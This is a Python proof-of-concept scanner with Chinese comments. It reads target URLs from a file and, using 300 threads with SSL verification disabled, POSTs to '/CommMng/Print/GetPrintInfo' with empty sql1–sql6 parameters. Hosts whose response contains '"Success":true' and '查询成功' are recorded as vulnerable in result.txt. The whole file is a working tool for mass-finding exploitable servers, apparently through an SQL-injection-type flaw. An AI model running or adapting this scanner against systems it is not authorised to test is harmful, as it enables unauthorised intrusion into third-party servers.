import requests
import urllib3
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程锁，用于安全写入文件
file_lock = threading.Lock()

def check_vulnerability(url):
    """
    检查单个URL是否存在漏洞
    """
    try:
        # 清理URL，确保格式正确
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # 构造目标URL
        target_url = urljoin(url, '/CommMng/Print/GetPrintInfo')
        
        # 设置请求头
        headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '45'
        }
        
        # POST数据
        data = 'type=test&sql1=&sql2=&sql3=&sql4=&sql5=&sql6='
        
        # 发送请求，禁用SSL验证，不跟随重定向
        response = requests.post(
            target_url,
            headers=headers,
            data=data,
            verify=False,
            timeout=10,
            allow_redirects=False  # 不跟随3xx重定向
        )
        
        status_code = response.status_code
        
        # 检查状态码
        if 300 <= status_code < 400:
            # 3xx状态码，认为不存在漏洞
            print(f"[!] {url} 状态码: {status_code} - 不存在漏洞")
            return None
            
        elif status_code == 200:
            # 检查响应内容
            response_text = response.text
            
            # 查找关键字符串（注意：原POC中是"Success":ture，可能是拼写错误）
            # 这里同时检查两种可能的拼写
            success_true = '"Success":true' in response_text
            success_ture = '"Success":ture' in response_text
            query_success = '查询成功' in response_text
            
            # 如果满足漏洞条件
            if (success_true or success_ture) and query_success:
                print(f"[+] {url} 状态码: {status_code} - 存在漏洞！")
                return (url, status_code, response_text[:200])  # 返回前200个字符用于验证
            else:
                print(f"[-] {url} 状态码: {status_code} - 响应内容不匹配")
                return None
                
        else:
            # 其他状态码，输出提示
            print(f"[-] {url} 状态码: {status_code} - 不存在漏洞")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[x] {url if 'url' in locals() else '未知URL'} 请求失败: {str(e)}")
        return None
    except Exception as e:
        print(f"[x] {url if 'url' in locals() else '未知URL'} 发生错误: {str(e)}")
        return None

def save_result(url, status_code):
    """
    将结果保存到文件，使用线程锁确保安全
    """
    with file_lock:
        try:
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"{url} {status_code}\n")
            print(f"[√] 已保存漏洞结果: {url}")
        except Exception as e:
            print(f"[x] 保存结果失败: {str(e)}")

def main():
    """
    主函数
    """
    # 读取URL列表
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            print("[!] url.txt文件中没有找到有效的URL")
            return
            
        print(f"[*] 共读取到 {len(urls)} 个URL")
        
        # 清空或创建结果文件
        with open('result.txt', 'w', encoding='utf-8') as f:
            f.write("")
        
        # 创建线程池，设置最大线程数为300
        max_workers = 300
        print(f"[*] 启动多线程检测，线程数: {max_workers}")
        
        vulnerable_count = 0
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 提交所有任务
            future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
            
            # 处理完成的任务
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                    if result:
                        url, status_code, response_preview = result
                        # 立即保存结果
                        save_result(url, status_code)
                        vulnerable_count += 1
                        
                except Exception as e:
                    print(f"[x] 处理 {url} 时发生异常: {str(e)}")
        
        # 输出统计信息
        print("\n" + "="*50)
        print(f"[*] 检测完成！")
        print(f"[*] 总共检测: {len(urls)} 个URL")
        print(f"[*] 发现漏洞: {vulnerable_count} 个")
        print(f"[*] 结果已保存到: result.txt")
        
    except FileNotFoundError:
        print("[x] 找不到url.txt文件，请确保文件存在")
    except Exception as e:
        print(f"[x] 程序运行出错: {str(e)}")

if __name__ == "__main__":
    # 设置requests默认不验证SSL
    requests.packages.urllib3.disable_warnings()
    
    print("""
    ========================================
     漏洞检测脚本
     Poc: POST /CommMng/Print/GetPrintInfo
     检测条件: 状态码200且响应包含"Success":true和"查询成功"
     线程数: 300
    ========================================
    """)
    
    main()